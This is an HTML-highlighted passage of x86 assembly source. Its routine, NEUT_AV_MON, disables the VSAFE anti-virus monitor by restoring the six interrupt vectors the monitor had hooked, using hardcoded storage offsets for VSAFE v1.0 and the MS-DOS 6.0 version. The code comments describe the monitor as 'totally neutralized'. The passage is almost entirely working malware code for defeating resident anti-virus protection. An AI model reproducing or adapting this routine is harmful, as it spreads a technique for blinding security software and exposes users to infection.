</span><span class="sc1">;FIND_AV_MON routine. </span><span class="sc0">

</span><span class="sc5">TABLE_SEGMENT</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;interrupt vector table </span><span class="sc0">
</span><span class="sc9">segment</span><span class="sc0">
</span><span class="sc5">NUM_RESTORE</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">6</span><span class="sc0">                       </span><span class="sc1">;number of vectors to </span><span class="sc0">
</span><span class="sc5">restore</span><span class="sc0">

</span><span class="sc5">NEUT_AV_MON</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">MON2_OFFSETS</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">MON1_OFFSETS</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MONITOR_TYPE</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;calc. string offset for </span><span class="sc0">
</span><span class="sc5">monitor</span><span class="sc0"> </span><span class="sc9">type</span><span class="sc4">/</span><span class="sc5">version</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">MON1_OFFSETS</span><span class="sc0">         
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;point to first value in </span><span class="sc0">
</span><span class="sc5">desired</span><span class="sc0"> </span><span class="sc5">monitor</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TABLE_OFFSETS</span><span class="sc0">         </span><span class="sc1">;ditto for table offset </span><span class="sc0">
</span><span class="sc5">string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">NUM_RESTORE</span><span class="sc0">                  </span><span class="sc1">;set counter to number </span><span class="sc0">
</span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">vectors</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">restore</span><span class="sc0">  
</span><span class="sc5">RESTORE_VECTS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;load monitor offset of </span><span class="sc0">
</span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">                       </span><span class="sc1">;test for skip restoral </span><span class="sc0">
</span><span class="sc5">value</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">SKIP</span><span class="sc0">                            </span><span class="sc1">;if skip value (FFFFH), </span><span class="sc0">
</span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc6">loop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">MONITOR_SEGMENT</span><span class="sc0">              </span><span class="sc1">;set ES to monitor </span><span class="sc0">
</span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;load original vector </span><span class="sc0">
</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">monitor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ORIGINAL_OFF</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">;store in scratch pad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;load original vector </span><span class="sc0">
</span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">monitor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ORIGINAL_SEG</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">;store in scratch pad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;load corresponding int. </span><span class="sc0">
</span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">TABLE_SEGMENT</span><span class="sc0">                </span><span class="sc1">;set ES to int. vector </span><span class="sc0">
</span><span class="sc5">table</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ORIGINAL_OFF</span><span class="sc0">                 </span><span class="sc1">;load original vector </span><span class="sc0">
</span><span class="sc9">offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">;store original offset </span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ORIGINAL_SEG</span><span class="sc0">                 </span><span class="sc1">;load original vector </span><span class="sc0">
</span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;store original segment </span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0">
</span><span class="sc5">SKIP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">;point SI to next string </span><span class="sc0">
</span><span class="sc5">value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">;ditto for DI</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">RESTORE_VECTS</span><span class="sc0">                   </span><span class="sc1">;loop to restore next </span><span class="sc0">
</span><span class="sc5">vector</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;all done, monitor is </span><span class="sc0">
</span><span class="sc5">totally</span><span class="sc0"> </span><span class="sc5">neutralized</span><span class="sc0">

</span><span class="sc5">ORIGINAL_OFF</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;temp. storage for </span><span class="sc0">
</span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">int.</span><span class="sc0"> </span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">
</span><span class="sc5">ORIGINAL_SEG</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">;ditto for segment</span><span class="sc0">

</span><span class="sc5">TABLE_OFFSETS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">004CH</span><span class="sc4">,</span><span class="sc2">0080H</span><span class="sc4">,</span><span class="sc2">0084H</span><span class="sc4">,</span><span class="sc2">009CH</span><span class="sc4">,</span><span class="sc2">00BCH</span><span class="sc4">,</span><span class="sc2">0100H</span><span class="sc0">     </span><span class="sc1">;offsets to INT </span><span class="sc0">
</span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0">

</span><span class="sc5">MON1_OFFSETS</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;VSAFE v1.0 </span><span class="sc0">
</span><span class="sc5">offsets</span><span class="sc0"> </span><span class="sc5">where</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">1967H</span><span class="sc4">,</span><span class="sc2">196FH</span><span class="sc4">,</span><span class="sc2">1977H</span><span class="sc4">,</span><span class="sc2">197BH</span><span class="sc4">,</span><span class="sc2">242AH</span><span class="sc4">,</span><span class="sc2">197FH</span><span class="sc0">     </span><span class="sc1">;original </span><span class="sc0">
</span><span class="sc5">vectors</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">stored</span><span class="sc0">
                                                        </span><span class="sc1">;(FFFFH = skip </span><span class="sc0">
</span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc5">restoral</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">MON2_OFFSETS</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;MS-DOS 6.0 </span><span class="sc0">
</span><span class="sc5">VSAFE</span><span class="sc0"> </span><span class="sc5">offsets</span><span class="sc0"> </span><span class="sc5">where</span><span class="sc0"> 
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0DB3H</span><span class="sc4">,</span><span class="sc2">0DBBH</span><span class="sc4">,</span><span class="sc2">0DC3H</span><span class="sc4">,</span><span class="sc2">0DC7H</span><span class="sc4">,</span><span class="sc2">141EH</span><span class="sc4">,</span><span class="sc2">0DCBH</span><span class="sc0">     </span><span class="sc1">;original </span><span class="sc0">
</span><span class="sc5">vectors</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">stored</span><span class="sc0">
                                                        </span><span class="sc1">;(FFFFH = skip </span><span class="sc0">
</span><span class="sc5">vector</span><span class="sc0"> </span><span class="sc5">restoral</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">MAIN</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">



</span></div></body>
</html>
